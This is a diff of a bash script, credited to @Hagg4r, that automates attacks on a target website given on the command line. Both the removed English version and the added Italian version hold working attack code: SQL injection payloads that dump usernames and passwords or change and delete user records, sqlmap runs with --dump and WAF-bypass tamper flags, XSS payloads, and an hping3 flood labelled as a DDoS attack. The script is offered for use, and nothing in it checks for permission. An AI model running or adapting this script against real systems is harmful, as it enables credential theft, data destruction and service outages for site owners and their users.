@@ -1,301 +1,169 @@
 #!/bin/bash
 
-# Author information
-echo "by @Hagg4r"
-
-# Function to run a command and return its output
-run_command() {
-    "$@" 2>&1
-}
-
-# Function to run a command with sudo and return its output
-run_sudo_command() {
-    sudo "$@" 2>&1
-}
-
-# Function to save data to a file
-save_to_file() {
-    local filepath="$1"
-    local data="$2"
-    echo "$data" >> "$filepath"
-}
-
-# Function to install necessary tools if not already installed
+# Funzione per installare i tool necessari
 install_tools() {
-    declare -A tools=(
-        ["curl"]="curl"
-        ["sqlmap"]="sqlmap"
-        ["nmap"]="nmap"
-        ["uniscan"]="uniscan"
-        ["whois"]="whois"
-        ["subfinder"]="subfinder"
-        ["xsser"]="xsser"
-        ["hping3"]="hping3"
-        ["sqlninja"]="sqlninja"
-        ["imagemagick"]="imagemagick"
-        ["openvpn"]="openvpn"
-    )
-
-    for tool in "${!tools[@]}"; do
-        echo "Checking if $tool is installed..."
+    local tools=("curl" "hping3" "nmap" "sqlmap" "whois")
+    
+    for tool in "${tools[@]}"; do
         if ! command -v "$tool" &> /dev/null; then
-            echo "$tool not found. Installing $tool..."
-            run_sudo_command apt-get install -y "${tools[$tool]}"
+            echo "$tool non trovato. Installazione in corso..."
+            sudo apt-get update && sudo apt-get install -y "$tool"
         else
-            echo "$tool is already installed."
+            echo "$tool è già installato."
         fi
     done
 }
 
-# Function to clear the terminal screen
-clear_screen() {
-    clear
-}
-
-# Function to print the animated header
-print_header() {
-    local colors=('\033[91m' '\033[93m' '\033[92m' '\033[94m' '\033[95m' '\033[96m')
-    local header="
-     __  .__   __.   ______  __    __   __          ___   .___________.  ______   .______      
-|  | |  \\ |  |  /      ||  |  |  | |  |        /   \\  |           | /  __  \\  |   _  \\     
-|  | |   \\|  | |  ,----'|  |  |  | |  |       /  ^  \\ `---|  |----`|  |  |  | |  |_)  |    
-|  | |  . \`  | |  |     |  |  |  | |  |      /  /_\\  \\    |  |     |  |  |  | |      /     
-|  | |  |\\   | |  \`----.|  \`--'  | |  \`----./  _____  \\   |  |     |  \`--'  | |  |\\  \\----.
-|__| |__| \\__|  \\______| \\______/  |_______/__/     \\__\\  |__|      \\______/  | _| \`._____|
-    "
-    for color in "${colors[@]}"; do
-        echo -e "$color$header"
-        sleep 0.5
-        clear_screen
-    done
-    echo -e "\033[0m"  # Reset color to default
-}
-
-# Function to check if the website is accessible
-check_website_status() {
+# Funzione per assicurarsi che l'URL abbia il prefisso http(s)
+ensure_http_prefix() {
     local url="$1"
-    if curl -s -o /dev/null -w "%{http_code}" "$url" | grep -q "200"; then
-        echo "The website $url is accessible."
-        return 0
-    else
-        echo "The website $url is not accessible."
-        return 1
+    if [[ ! "$url" =~ ^https?:// ]]; then
+        url="https://$url"
     fi
+    echo "$url"
 }
 
-# Function to perform SQL Injection
+# Funzione per eseguire un attacco XSS e salvare i risultati
+perform_xss_attack() {
+    local target_url="$1"
+    local results_file="scan_results/xss_attack.txt"
+    local payloads=(
+        "<script>alert('XSS1')</script>"
+        "<img src='x' onerror='alert(\"XSS2\")'>"
+        "<iframe src='javascript:alert(\"XSS3\")'></iframe>"
+        "<svg/onload=alert('XSS4')>"
+    )
+
+    echo "Esecuzione dell'attacco XSS su $target_url" > "$results_file"
+    for payload in "${payloads[@]}"; do
+        echo "Testing payload: $payload" >> "$results_file"
+        curl -s -G --data-urlencode "search=$payload" "$target_url" >> "$results_file"
+        echo "Payload sent: $payload" >> "$results_file"
+    done
+    echo "Risultati salvati in $results_file"
+}
+
+# Funzione per eseguire un attacco DDoS e salvare i risultati
+perform_ddos_attack() {
+    local target_ip="$1"
+    local port="$2"
+    local count="$3"
+    local results_file="scan_results/ddos_attack.txt"
+    
+    echo "Avvio dell'attacco DDoS su $target_ip:$port con $count pacchetti" > "$results_file"
+
+    if ! command -v hping3 &> /dev/null; then
+        echo "hping3 non trovato, installazione in corso..."
+        sudo apt-get update && sudo apt-get install -y hping3
+    fi
+
+    hping3 --flood -p "$port" "$target_ip" -c "$count" >> "$results_file" 2>&1
+    
+    echo "Attacco DDoS completato" >> "$results_file"
+    echo "Risultati salvati in $results_file"
+}
+
+# Funzione per eseguire un attacco SQL Injection e salvare i risultati
 perform_sql_injection() {
     local target_url="$1"
-    local results_dir="$2"
+    local results_file="scan_results/sql_injection.txt"
     local payloads=(
         "' OR 1=1 --"
         "' OR '1'='1' --"
         "' OR '1'='1'/*"
-        "' OR '1'='1'#"
-        "' OR 1=1 UNION SELECT 1,2,3 --"
-        "' OR 1=1 UNION SELECT NULL, NULL, NULL --"
+        "' OR 1=1 UNION SELECT NULL, NULL --"
         "' OR 1=1 UNION SELECT username, password FROM users --"
-        "' OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns --"
-        "' OR 1=1 UNION SELECT email FROM users --"
-        "' OR 1=1 UNION SELECT password FROM users --"
-        "' OR 1=1 UNION SELECT contact_name, contact_number FROM contacts --"
         "SELECT * FROM users WHERE username='admin';"
         "INSERT INTO users (username, password) VALUES ('newuser', 'newpassword');"
         "UPDATE users SET password='newpassword' WHERE username='admin';"
         "DELETE FROM users WHERE username='olduser';"
-        "SELECT * FROM products WHERE name LIKE '%user_input%';"
-        "SELECT * FROM products WHERE name LIKE '%admin%' UNION SELECT username, password FROM users;"
-        "SELECT * FROM users WHERE username='user_input' AND password='password_input';"
-        "SELECT * FROM users WHERE username='admin' AND password=' OR 1=1 -- ';"
-        "SELECT * FROM products WHERE name LIKE '%user_input%';"
-        "SELECT * FROM products WHERE name LIKE '%admin%' AND SLEEP(5);"
-        "-- -"
-        "-- /*"
-        "-- #"
-        "/*!*/"
-        "OR 1=1"
-        "OR 'a'='a'"
-        "OR 'a'='a' --"
-        "OR 'a'='a' /*"
-        "OR 'a'='a' #"
-        "OR 'a'='a' /*!' OR 'a'='a'"
     )
 
-    local file_count=1
+    echo "Esecuzione dell'attacco SQL Injection su $target_url" > "$results_file"
     for payload in "${payloads[@]}"; do
-        local data="username=admin${payload}&password=password"
+        echo "Testing payload: $payload" >> "$results_file"
         local response
-        response=$(curl -s -d "$data" -X POST "$target_url")
-        local output_file="$results_dir/sql_injection_${file_count}.txt"
-        save_to_file "$output_file" "$response"
-        echo "Saved SQL Injection results to $output_file"
-        ((file_count++))
+        response=$(curl -s -d "username=admin&password=$payload" -X POST "$target_url")
+        echo "Response for payload '$payload':" >> "$results_file"
+        echo "$response" >> "$results_file"
     done
+    echo "Risultati salvati in $results_file"
 }
 
-# Function to perform a SQLmap scan with WAF bypass
-perform_sqlmap_scan() {
+# Funzione per eseguire una scansione completa del sito web e salvare i risultati
+perform_full_scan() {
     local target_url="$1"
-    local results_dir="$2"
-
-    local cookie_file="$results_dir/cookies.txt"
-    curl -c "$cookie_file" -s "$target_url" > /dev/null
-    local cookies=$(awk '{print $6"="$7}' "$cookie_file" | tail -n +2 | tr '\n' ';')
-
-    local commands=(
-        "--dbs"
-        "--tables"
-        "--columns"
-        "--dump"
-        "--batch"
-        "--level=5 --risk=3"
-        "--technique=U"
-        "--technique=T"
-        "--passwords"
-        "--users"
-        "--current-user"
-        "--current-db"
-        "--is-dba"
-        "--roles"
-        "--privileges"
-        "--fingerprint"
-    )
-
-    local waf_bypass_flags="--random-agent --tamper=space2comment,between,modsecurityversioned"
-
-    local file_count=1
-    for command in "${commands[@]}"; do
-        local result
-        result=$(run_command sqlmap -u "$target_url" --cookie="$cookies" $command --batch --forms --crawl=2 $waf_bypass_flags)
-        local output_file="$results_dir/sqlmap_scan_${file_count}.txt"
-        save_to_file "$output_file" "$result"
-        echo "Saved SQLmap scan results to $output_file"
-        ((file_count++))
-    done
-}
-
-# Function to perform an FTP scan
-perform_ftp_scan() {
-    local target_url="$1"
-    local results_dir="$2"
-    local file_count=1
-    local result
-    result=$(run_command nmap -p 21 --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 "$target_url")
-    local output_file="$results_dir/ftp_scan_${file_count}.txt"
-    save_to_file "$output_file" "$result"
-    echo "Saved FTP scan results to $output_file"
-    ((file_count++))
-}
-
-# Function to perform a Uniscan scan
-perform_uniscan_scan() {
-    local target_url="$1"
-    local results_dir="$2"
-    local result
-    result=$(run_command uniscan -u "$target_url" -qdgsql)
-    local output_file="$results_dir/uniscan_scan.txt"
-    save_to_file "$output_file" "$result"
-    echo "Saved Uniscan scan results to $output_file"
-}
-
-# Function to perform a WHOIS lookup
-perform_whois_lookup() {
-    local target_url="$1"
-    local results_dir="$2"
-    local result
-    result=$(run_command whois "$target_url")
-    local output_file="$results_dir/whois_lookup.txt"
-    save_to_file "$output_file" "$result"
-        echo "Saved WHOIS lookup results to $output_file"
-}
-
-# Function to perform a subdomain scan
-perform_subdomain_scan() {
-    local domain="$1"
-    local results_dir="$2"
-    local result
-    result=$(run_command subfinder -d "$domain")
-    local output_file="$results_dir/subdomain_scan.txt"
-    save_to_file "$output_file" "$result"
-    echo "Saved Subdomain scan results to $output_file"
-}
-
-# Function to perform an XSS scan
-perform_xss_scan() {
-    local target_url="$1"
-    local results_dir="$2"
-    local result
-    result=$(run_command xsser -u "$target_url")
-    local output_file="$results_dir/xss_scan.txt"
-    save_to_file "$output_file" "$result"
-    echo "Saved XSS scan results to $output_file"
-}
-
-# Function to perform a network scan
-perform_network_scan() {
-    local target_ip="$1"
-    local results_dir="$2"
-    local result
-    result=$(run_command nmap -sS -sU -T4 -A -v "$target_ip")
-    local output_file="$results_dir/network_scan.txt"
-    save_to_file "$output_file" "$result"
-    echo "Saved Network scan results to $output_file"
-}
-
-# Function to perform a ping scan
-perform_ping_scan() {
-    local target_ip="$1"
-    local results_dir="$2"
-    local result
-    result=$(run_command hping3 -1 "$target_ip")
-    local output_file="$results_dir/ping_scan.txt"
-    save_to_file "$output_file" "$result"
-    echo "Saved Ping scan results to $output_file"
-}
-
-# Function to perform a VPN scan
-perform_vpn_scan() {
-    local target_ip="$1"
-    local results_dir="$2"
-    local result
-    result=$(run_command nmap -p 1194 --script openvpn "$target_ip")
-    local output_file="$results_dir/vpn_scan.txt"
-    save_to_file "$output_file" "$result"
-    echo "Saved VPN scan results to $output_file"
-}
-
-# Main script execution
-main() {
-    local target_url="$1"
-    local results_dir="$2"
-
-    if [ -z "$target_url" ] || [ -z "$results_dir" ]; then
-        echo "Usage: $0 <target_url> <results_dir>"
+    local target_ip
+    target_ip=$(dig +short "$target_url" | head -n 1)
+    local results_dir="scan_results"
+    
+    if [ -z "$target_ip" ]; then
+        echo "Impossibile risolvere l'IP per $target_url"
         exit 1
     fi
 
-    # Create results directory if it does not exist
-    if [ ! -d "$results_dir" ]; then
-        run_command mkdir -p "$results_dir"
-    fi
+    mkdir -p "$results_dir"
 
-    # Install necessary tools
-    install_tools
+    echo "Esecuzione della scansione completa per $target_url ($target_ip)..."
 
-    # Perform scans and checks
-    check_website_status "$target_url"
+    local nmap_file="$results_dir/nmap_scan.txt"
+    local sqlmap_file="$results_dir/sqlmap_scan.txt"
+    local whois_file="$results_dir/whois_lookup.txt"
 
-    perform_sql_injection "$target_url" "$results_dir"
-    perform_sqlmap_scan "$target_url" "$results_dir"
-    perform_ftp_scan "$target_url" "$results_dir"
-    perform_uniscan_scan "$target_url" "$results_dir"
-    perform_whois_lookup "$target_url" "$results_dir"
-    perform_subdomain_scan "$(echo "$target_url" | awk -F/ '{print $3}')" "$results_dir"
-    perform_xss_scan "$target_url" "$results_dir"
-    perform_network_scan "$(echo "$target_url" | awk -F/ '{print $3}')" "$results_dir"
-    perform_ping_scan "$(echo "$target_url" | awk -F/ '{print $3}')" "$results_dir"
-    perform_vpn_scan "$(echo "$target_url" | awk -F/ '{print $3}')" "$results_dir"
+    echo "1. Esecuzione della scansione Nmap..." > "$nmap_file"
+    nmap -sV -p- "$target_ip" >> "$nmap_file"
+
+    echo "2. Esecuzione della scansione SQLmap..." > "$sqlmap_file"
+    sqlmap -u "$target_url" --batch --risk=3 --level=5 --dump >> "$sqlmap_file"
+
+    echo "3. Esecuzione del WHOIS lookup..." > "$whois_file"
+    whois "$target_url" >> "$whois_file"
+    
+    echo "Scansione completa completata. I risultati sono stati salvati in $results_dir"
 }
 
-# Run the main function with all arguments
-main "$@"
+# Controllo degli argomenti e chiamata delle funzioni
+if [ "$#" -lt 2 ]; then
+    echo "Usage: $0 <attack_type> <target> [<port> <count>]"
+    echo "Attack types:"
+    echo "  xss    - Perform XSS attack"
+    echo "  ddos   - Perform DDoS attack"
+    echo "  sql    - Perform SQL Injection attack"
+    echo "  scan   - Perform a full website scan"
+    exit 1
+fi
+
+# Installazione dei tool necessari
+install_tools
+
+attack_type="$1"
+target="$2"
+shift 2
+
+# Assicurati che l'URL abbia il prefisso http(s)
+target=$(ensure_http_prefix "$target")
+
+case "$attack_type" in
+    xss)
+        perform_xss_attack "$target"
+        ;;
+    ddos)
+        if [ "$#" -ne 2 ]; then
+            echo "Usage for ddos: $0 ddos <target_ip> <port> <count>"
+            exit 1
+        fi
+        port="$1"
+        count="$2"
+        perform_ddos_attack "$target" "$port" "$count"
+        ;;
+    sql)
+        perform_sql_injection "$target"
+        ;;
+    scan)
+        perform_full_scan "$target"
+        ;;
+    *)
+        echo "Unknown attack type: $attack_type"
+        exit 1
+        ;;
+esac
